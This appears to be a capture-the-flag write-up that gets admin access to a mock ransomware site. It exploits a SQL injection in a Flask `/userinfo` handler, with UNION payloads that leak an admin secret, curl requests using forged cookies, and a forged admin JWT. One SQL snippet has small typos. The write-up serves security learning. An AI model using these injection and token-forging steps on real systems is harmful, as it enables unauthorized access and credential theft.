# Task 7

## Background
> With access to the site, you can access most of the functionality. But there's still that admin area that's locked off.
>
> Generate a new token value which will allow you to access the ransomware site as an administrator.
>
> ### Prompt:
> Enter a token value which will allow you to login as an administrator.

## Writeup
TL;DR: The `/userinfo` page is vulnerable to SQL injection; use this to exfiltrate an admin's secret, then generate a valid cookie using that secret.

Now that we know how the login cookies are generated, in order to generate an admin cookie we need two things: the uid for an admin, and their secret. To do this, we'd need access to the backend database which holds all the user info. Looking at the database accesses done by the server, most use parameterized queries, except for `userinfo`.
```python
def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
	with util.userdb() as con:	
		infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
		row = con.execute(infoquery).fetchone()	
		if row != None:
			userName = query
			memberSince = int(row[0])
			clientsHelped = int(row[1])
			hackersHelped = int(row[2])
			contributed = int(row[3])
	if memberSince != '':
		memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
	resp = make_response(render_template('userinfo.html', 
		userName=userName,
		memberSince=memberSince, 
		clientsHelped=clientsHelped,
		hackersHelped=hackersHelped, 
		contributed=contributed,
		pathkey=expected_pathkey()))
	return resp
```

This page takes a username as a GET query parameter, then looks up some info about that user, displaying the retrieved values as `int`s. However, the thing we care more about is that the query (`infoquery`) is constructed using simple string substitution, which makes it vulnerable to SQL injection. We can test this by running the following (we know the attacker's username from requesting `/userinfo` with their token):
```
$ python3 forge_token.py 16963 > fake_token
$ curl --cookie fake_token "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/userinfo?user=LamentableConservative'--"
...
<body>
        <h1> User Info (LamentableConservative&#39;--) </h1>
        <div class="row">
          <div class="column">
            <div class="box">
              <h3> Date Joined: </h3>
                <p>2021-11-03</p>
            </div>
          </div>
          <div class="column">
            <div class="box">
              <h3> Jobs Completed: </h3>
              <p>19</p>
            </div>
          </div>
          <div class="column">
            <div class="box">
              <h3> Users Helped: </h3>
              <p>27</p>
            </div>
          </div>
          <div class="column">
            <div class="box">
              <h3> Programs Contributed: </h3>
              <p>2</p>
            </div>
          </div>
        </div>
</body>
...
```

The fact that it still spits out our dear friend LamentableConservative's info even though the username given in the request doesn't match exactly means that we have a viable strategy. The only thing that we need to figure out is how to get the admin's secret, which is an alphanumeric string, into the `int` form that this page displays. There are many ways to do this, some more clever than others (i.e. less requests), but I went with the simple option of hex-encoding the secret and sending one hex digit per field. The relevant SQL snippet looks like this.
```sql
INSTR('01234567889ABCDEF', SUBSTR(HEX(<secret>, <index>, 1)))
```

We know the admin's username from `/adminlist`, so the username query we want looks something like
```
idk' UNION SELECT u2.memberSince, INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 1, 1))), INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 2, 1))), INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 3, 1))) FROM UserInfo u2 INNER JOIN Accounts a2 ON u2.uid=a2.uid WHERE a2.userName='HelpfulHandball';--
```

After substitution, the query passed to the backend database would be
```sql
SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='idk' UNION SELECT u2.memberSince, INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 1, 1))), INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 2, 1))), INSTR('0123456789ABCDEF', SUBSTR(HEX(a2.secret, 3, 1))) FROM UserInfo u2 INNER JOIN Accounts a2 ON u2.uid=a2.uid WHERE a2.userName='HelpfulHandball';--'
```

The first selection does nothing, since there isn't a user called "idk", so the only record returned has the membership date (which is replaced by the server anyways, if not empty) and three `int`s representing some digits of the hex-encoded admin secret. We can repeat this, each time getting three more hex digits of secret, until we get the whole thing.

```bash
$ python3 retrieve_secret.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjAyMzgwMzQsImV4cCI6MTY2MjgzMDAzNCwidWlkIjoxNjk2Mywic2VjIjoicmFaUnR1dDJQNHVOZHYySjVsTmI2WmJqR21pUXdQUXkifQ.aSnQHsGETQdqKj9ziprfoHxWt1_sg5_lqsaowWA8I4I"
...
HAEu7PiO8mq7g43xMXKdJUVvajbde8pK
```

Now that we have the secret, we just need the admin's uid, which we can get from one last query injection (replacing all spaces with `%20` to satisfy curl).
```
$ curl --cookie fake_token "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/userinfo?user=idk'%20UNION%20SELECT%200,a2.uid,0,0%20FROM%20Accounts%20a2%20WHERE%20a2.userName='HelpfulHandball'--;"
...
<h3> Jobs Completed: </h3>
<p>9076</p>
...
```

Finally, we update the token forging script with the new credentials, run it one more time, then submit the cookie value to get our task 7 badge!
```
$ python3 forge_token.py 9076
# Netscape HTTP Cookie File
xekflqhmhrsoelot.ransommethis.net	FALSE	/	TRUE	2145916800	tok	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjAyNTkxMjksImV4cCI6MTY2Mjg1MTEyOSwidWlkIjo5MDc2LCJzZWMiOiJIQUV1N1BpTzhtcTdnNDN4TVhLZEpVVnZhamJkZThwSyJ9.AV80EhF0pGBTMDDtnwNfmmAzYdO1QI30V0QgA_d4oQM 
```